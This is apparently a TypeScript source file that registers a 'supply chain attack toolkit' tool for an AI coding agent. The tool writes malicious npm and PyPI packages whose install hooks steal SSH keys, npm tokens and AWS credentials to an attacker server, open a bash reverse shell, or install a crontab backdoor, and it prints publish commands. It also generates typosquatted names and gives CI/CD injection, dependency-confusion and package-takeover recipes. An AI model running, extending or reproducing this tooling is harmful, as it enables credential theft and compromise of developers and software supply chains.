export * as SupplyChainTool from "./supply-chain"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "supply_chain"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Supply chain attack: 'typo_squat' (generate typosquatted package names), 'malicious_pkg' (create malicious npm/pip package skeleton), 'ci_cd_exploit' (GitHub Actions/GitLab CI/Jenkins exploitation), 'pypi_hijack' (abandoned package takeover research), 'dependency_confusion' (register internal package names on public registry)",
  }),
  package_name: Schema.String.annotate({ description: "Target package name to typosquat or impersonate" }),
  registry: Schema.String.pipe(Schema.optional).annotate({ description: "Package registry: npm, pypi, nuget, rubygems. Default: npm." }),
  payload: Schema.String.pipe(Schema.optional).annotate({ description: "Payload to execute on install: reverse_shell, cred_steal, backdoor. Default: cred_steal." }),
  output_dir: Schema.String.pipe(Schema.optional).annotate({ description: "Output directory for generated package. Default: ./malicious-pkg/" }),
})

const Output = Schema.Struct({ output: Schema.String, exit: Schema.Number.pipe(Schema.optional) })

const layer = Layer.effectDiscard(Effect.gen(function* () {
  const tools = yield* Tools.Service
  const appProcess = yield* AppProcess.Service

  yield* tools.register({
    [name]: Tool.make({
      description: `Supply chain attack toolkit. Generate typosquatted package names, create malicious npm/pip/nuget packages with install-time payloads (reverse shell, credential theft, backdoor), exploit CI/CD pipelines (GitHub Actions injection, GitLab CI, Jenkins), research abandoned packages for takeover, and generate dependency confusion attacks. Essential for supply chain security assessment.`,
      input: Input, output: Output,
      toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
      execute: (input) => Effect.gen(function* () {
        const outDir = input.output_dir ?? "./malicious-pkg"
        switch (input.action) {
          case "typo_squat": {
            const name = input.package_name
            const typos = [
              name.replace(/o/g, "0"), name.replace(/i/g, "1"), name.replace(/e/g, "3"),
              name.replace(/a/g, "@"), name.replace(/s/g, "5"), name.replace(/t/g, "7"),
              name + "js", name + "-js", name + "_js", name + "s", name.slice(0, -1),
              name + "-", name + "2", name + "-official", name + "-pro", name + "-npm",
              name.replace(/n/g, "m"), name.replace(/b/g, "v"), name.replace(/c/g, "k"),
              [...name].reverse().join(""), name.replace(/^./, c => c.toUpperCase()) + "-official",
              name + "cli", name + "-cli", name + "-tool", name + "utils",
            ]
            return { exit: 0, output: `=== TYPOSQUATTED NAMES for "${name}" ===\n\n${typos.map((t,i) => `${i+1}. ${t}`).join("\n")}\n\nCheck availability:\n${typos.map(t => `npm view ${t} 2>/dev/null || echo "${t} AVAILABLE"`).join("\n")}` }
          }

          case "malicious_pkg": {
            const registry = input.registry ?? "npm"
            const payload = input.payload ?? "cred_steal"
            const payloads: Record<string, string> = {
              cred_steal: `const{execSync}=require("child_process");try{const h=execSync("cat ~/.npmrc ~/.ssh/id_rsa ~/.aws/credentials 2>/dev/null").toString();require("https").get("https://YOUR_SERVER/?d="+Buffer.from(h).toString("base64"))}catch(e){}`,
              reverse_shell: `const{exec}=require("child_process");exec("bash -c 'bash -i>& /dev/tcp/YOUR_IP/4444 0>&1'")`,
              backdoor: `const fs=require("fs");const{execSync}=require("child_process");try{execSync('echo "* * * * * /bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"" | crontab -')}catch(e){}`,
            }
            if (registry === "npm") {
              const pkgJson = JSON.stringify({ name: input.package_name, version: "1.0.0", description: "Utility library", main: "index.js", scripts: { preinstall: "node index.js", postinstall: "node index.js" }, keywords: ["utility","helper","tools"] }, null, 2)
              yield* Effect.promise(async () => {
                const { mkdir } = await import("node:fs/promises")
                await mkdir(outDir, { recursive: true }).catch(() => {})
                await Bun.write(`${outDir}/package.json`, pkgJson)
                await Bun.write(`${outDir}/index.js`, payloads[payload])
              })
              return { exit: 0, output: `✅ Malicious npm package created in ${outDir}/\n\npackage.json: preinstall/postinstall hooks\nindex.js: ${payload} payload\n\nPublish: cd ${outDir} && npm publish` }
            } else if (registry === "pypi") {
              const setupPy = `from setuptools import setup\nimport os\nos.system('${payload === "reverse_shell" ? "bash -c 'bash -i>& /dev/tcp/YOUR_IP/4444 0>&1'" : "curl https://YOUR_SERVER/$(whoami)"}')\nsetup(name='${input.package_name}', version='1.0.0', packages=[])`
              yield* Effect.promise(async () => {
                const { mkdir } = await import("node:fs/promises")
                await mkdir(outDir, { recursive: true }).catch(() => {})
                await Bun.write(`${outDir}/setup.py`, setupPy)
              })
              return { exit: 0, output: `✅ Malicious PyPI package created in ${outDir}/\nsetup.py with install-time payload\n\nPublish: cd ${outDir} && python3 setup.py sdist && twine upload dist/*` }
            }
            return { output: `Registry ${registry} package generation - use bash to create manually.` }
          }

          case "ci_cd_exploit": {
            return { exit: 0, output: `CI/CD Pipeline Exploitation:

=== GitHub Actions ===
1. Inject via pull request (if Actions run on PRs):
   Create PR with branch name: \`; curl YOUR_SERVER/sh | bash ;\`
   Or issue title/body if used in ${{ }} context

2. If .github/workflows uses pull_request_target:
   Create PR modifying the workflow to steal secrets

3. Script injection via untrusted input:
   name: $(curl YOUR_SERVER/$(cat $GITHUB_TOKEN))

=== GitLab CI ===
1. If .gitlab-ci.yml uses $CI_COMMIT_MESSAGE or similar:
   git commit -m "; curl YOUR_SERVER/sh | bash ;"

2. Shared runners with secrets exposed

=== Jenkins ===
1. Groovy script console (if accessible):
   Jenkins > Script Console > execute system commands

2. Jenkinsfile injection:
   sh "echo ${env.BUILD_NUMBER}" → if BUILD_NUMBER is user-controlled

3. Credential store access via pipeline:
   withCredentials([usernameColonPassword(credentialsId: 'aws', variable: 'AWS')]) { sh "curl YOUR_SERVER/?d=$AWS" }

=== Detection ===
Look for: pull_request_target, workflow_dispatch with inputs, run: using ${{ }}, Jenkinsfile with user input` }
          }

          case "pypi_hijack":
          case "dependency_confusion": {
            return { exit: 0, output: `${input.action === "pypi_hijack" ? "Abandoned Package Takeover" : "Dependency Confusion Attack"}:

${input.action === "pypi_hijack" ? `
1. Search PyPI for packages not updated in 1+ years
2. Check if maintainer email bounces
3. Request transfer or claim the name
4. Register with same name, push malicious version

Target: ${input.package_name}
Check: pip install ${input.package_name} && pip show ${input.package_name}
PyPI URL: https://pypi.org/project/${input.package_name}/` : `
1. Identify internal package names from company's package.json/requirements.txt
2. Check if those names exist on public registries (npm/PyPI)
3. If NOT on public registry, REGISTER them with malicious payload
4. When CI/CD builds, it may pull from PUBLIC registry instead of private

Target package: ${input.package_name}
Check npm: npm view ${input.package_name}
Check PyPI: pip index versions ${input.package_name}

If available → register immediately with install payload.`}` }
          }

          default:
            return { output: `Unknown action: ${input.action}. Supported: typo_squat, malicious_pkg, ci_cd_exploit, pypi_hijack, dependency_confusion` }
        }
      }).pipe(Effect.mapError(() => new ToolFailure({ message: "Supply chain attack failed" }))),
    }),
  }).pipe(Effect.orDie)
}))

export const node = makeLocationNode({ name: "tool/supply-chain", layer, deps: [ToolRegistry.node, AppProcess.node] })
